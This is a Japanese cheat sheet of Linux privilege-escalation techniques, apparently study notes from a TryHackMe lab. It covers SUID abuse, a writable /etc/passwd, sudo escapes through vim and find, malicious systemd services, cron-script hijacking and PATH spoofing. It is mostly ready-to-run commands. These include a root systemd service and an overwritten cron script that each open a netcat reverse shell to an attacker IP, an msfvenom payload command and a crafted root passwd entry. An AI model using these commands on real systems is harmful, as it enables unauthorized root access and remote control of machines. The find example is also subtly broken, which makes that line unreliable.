# Linux環境における権限昇格の基本Tips

## SUID/GUIDの悪用
SUIDやGUIDのついている実行ファイルやスクリプトは，所有者の権限で動作する．そのファイルやスクリプトが脆弱だったり，任意のコマンドを受け付けるような場合は、所有者の権限でシェルを起動することが可能．

つまり，rootユーザが所有者で，一般ユーザでも実行可能なシェルを起動するプログラム(run_shell)がある場合，rootユーザの権限でシェルを起動可能．
```
$ ls -al run_shell
rws-rwx-rwx root root _ _ _ _ run_shell
$ ./run_shell
# whoami
root
```

SUIDやGUIDは下記を見れば把握できる
```
SUID:rws-rwx-rwx
GUID:rwx-rws-rwx
```

SUID/GUIDがついたものの列挙
```
$ find / -perm -u=s -type f 2>/dev/null
```

## /etc/passwd に書き込み可能な場合の悪用
一般ユーザの権限不備など何らかの理由で/etc/passwdに書き込み権限がある場合，手動でrootグループユーザを追加可能．<br>
追加後，suで追加したユーザに切り替えることでrootユーザに昇格可能．

### /etc/passwdのフォーマット
```
test:x:0:0:root:/root:/bin/bash
[username]:[password]:[UID]:[GID]:[useridinfo]:[homedir]:[defaultshell]
```

特に，passwordはxとすると，/etc/shadowを見に行くが，直接ハッシュを入力してもOK．
ハッシュはOpensslコマンドで生成可能
```
Example) openssl passwd -1 -salt [salt] [password]
$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```
### 権限昇格
例えば，ユーザ名new，パスワード123でrootグループのユーザを追加するには，下記を/etc/passwdに追記する．
```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

追加したユーザにsuするとrootになれる．
```
$ su new
Password: 123
# whoami
root
```
## 任意のコマンド実行可能なコマンド・ツールの悪用
vi(vim)やfindコマンド（多分ほかにもたくさんある）は，任意のコマンドを実行中の権限で実行可能．<br>
つまり，これらのコマンドをroot権限で実行できる場合，権限昇格が可能．

### sudo設定の確認
```
$ sudo -l
```

### vim(vi)
```
$ sudo vim (or) $ sudo vi
(vim中において)
:!/bin/sh
# whoami
root
```

### find
```
$ touch foo
$ sudo find foo -exec /bin/sh `;
# whoami
root
```
### tar

### etc...
https://gtfobins.github.io/

## systemctlの悪用
sytemctlコマンドが利用可能な場合，rootで動作するサービスとして登録し，有効にすると任意のコマンドがroot権限で実行できる．

### サービススクリプトの作成
#### root権限のリバースシェル
```
$ echo '[Unit]
> Description=rootshell
> [Service]
> Type=simple
> User=root
> ExecStart=/bin/sh -c "mkfifo /tmp/osabdsu; nc [ATTACKER_IP] 8888 0</tmp/osabdsu | /bin/sh >/tmp/osabdsu 2>&1; rm /tmp/osabdsu"
> [Install]
> WantedBy=multi-user.target' > /tmp/root.service
```
#### 何かしらのroot権限下のファイルを/tmpへ出力
```
$ echo '[Service]
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > /tmp/output.service
```

### サービススクリプトの登録と有効化
サービスの登録
```sh
$ /bin/systemctl link /tmp/[SERVICE_NAME].service
```
サービスの有効化
```sh
$ /bin/systemctl enable /tmp/[SERVICE_NAME].service
```
サービスの開始
```sh
$ /bin/systemctl start [SERVICE_NAME]
```

## crontabの悪用
root権限で動くcronjobのスクリプトファイルに書き込み権限がある場合，そのスクリプトファイルを改ざんすることで任意のコマンドをroot権限で実行できる．

### crontab設定の確認
```
$ cat /etc/crontab
```

### 悪用
例えば，TargetPCにてrootで動くcronjob(cronscript.sh)の中身をリバースシェルのPayloadに置き換えると，AttackerPCでrootシェルに接続可能．

TargetPC
```
$ ls
cronscript.sh
$ echo "mkfifo /tmp/osabdsu; nc [ATTACKER_IP] 8888 0</tmp/osabdsu | /bin/sh >/tmp/osabdsu 2>&1; rm /tmp/osabdsu" > cronscript.sh
```

AttackerPC
```
$ nc -nlvp 8888
```

#### msfvenomの利用
```
$ msfvenom -p cmd/unix/reverse_netcat lhost=[ATTACKER_IP] lport=8888 R
```

## PATH悪用によるコマンドの偽装
rootで動作するプログラム内で，コマンドを絶対パス以外で呼び出している場合コマンドを偽造して任意のコマンドを実行可能．

例えば，プログラム(run_ls)内でlsを呼び出している場合，下記のようにPATHを設定することでコマンドを偽装できる．
```
$ run_ls
[contents]
$ echo "/bin/sh" > /tmp/ls
$ chmod +x /tmp/ls
$ export PATH=/tmp:$PATH
$ run_ls
# whoami
root
```
これ，aliasでもうまいことできないかな，と思ったけどできなかった．

## Linux Kernel Exploit
Linuxカーネルの脆弱性でローカル権限昇格を行う．ディストリビューションやカーネルバージョンでExploitをサーチする．

## Further Learning
 - https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 - https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
 - https://payatu.com/guide-linux-privilege-escalation

### Reference
 - https://tryhackme.com/room/commonlinuxprivesc
 - https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
 
